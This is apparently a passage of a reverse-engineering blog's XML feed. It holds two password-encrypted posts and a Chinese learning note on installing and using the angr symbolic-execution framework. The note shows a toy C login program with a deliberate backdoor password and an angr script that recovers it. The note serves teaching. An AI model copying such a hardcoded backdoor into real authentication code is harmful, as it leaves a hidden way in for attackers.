M/7pbVy2FTqlXvQbMH/4o33P3vBO00NcNNmsIfsp98gpqgoOdtzJiIJU3vbRVCvL7ORSuMA6QcEFQqUQ5HOpFFLG4Ror4c+A0cdDMvR0WhzHgkV7MsFY8I5RUlHFddDCbl4Ra7Dxmi+zP0/Mr6BtN6WPsIcWmnvM7Vj5vtZG6akbrtmzlqsqyjZc9XHw5lcEBvwI3HdAovGwVzyyLv1jJgF1YCXC7URRVZmj68U2JSOUnryRpjxm4YtioHR4RBv6wlgwP0ytGfOMBuoHqbRDOilTtvJzXZXKO9N02tgTZ0bGXskxKDjatMWVqjAfvTwUbbaUEY1VMdefmJFi4tlGsvpbu7bvfXYAxSG+fKnTcKGjJjPe0dEtQxosCU7NkV2jhdLsRTL7uzXRHMKwMnE6sYT6aQ1pQuELcCYCf30vjnrOyeWNSiddLFtpm6eGOsPDu/LyzbikjAjFoJvUwmnfpFwl3Z5lmo8dVZY+sQ2CxOihOeMyxL/Rd9vPDh4SDFH6SmUJKS9446xu9VQUdi11zEER3uN2QwtsGClCIJ8I3J7wFv+/kijoHPzU9YeDJgStfA1Nc84TPU8gVf5g7X4If66pNcBE5lN2SiGIii5vrEDHbBxcuAlp5LXzfigYqDFxB/Arfz1jQWEhxwTkcUxnZIecWTUPryl29Ihs4hHrh6kj7JVSSFR7wQ9VLbNjF+uyvhBpWHkUOZxUD47ITjpnCcQC08jntsMBo/Ja2gpebvUQc8Atf5nHv7v33vKaDHyU46m/yR5Kn7vxiwxKQXD421ZBzALfyDt4cCKjlrWGu++PcB/ob7flOo33eOBJshN7X79HDwsmmGYdvjM51gkPZUev+jcdvw/uZCJdrLd//0v5uk7SSce9C2Srs3nUn8P3mVVuyf2qyd9agWbbJZBn9Un+eeeMnyscXzn6FpLJNBlTP+OoBziejRaTH2Ov4jGsyePDIS3yct4sgTGMGyrJs7x1izdJD7tC+PyWjnJBPc/Q/PbCitJ2p/UFO7t+cjOSBzDsvG1I/4KuXTXfNnZqt5gm9ztixfXmWn6ci9trptK47CuRDC9</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-02T10:54:02.233Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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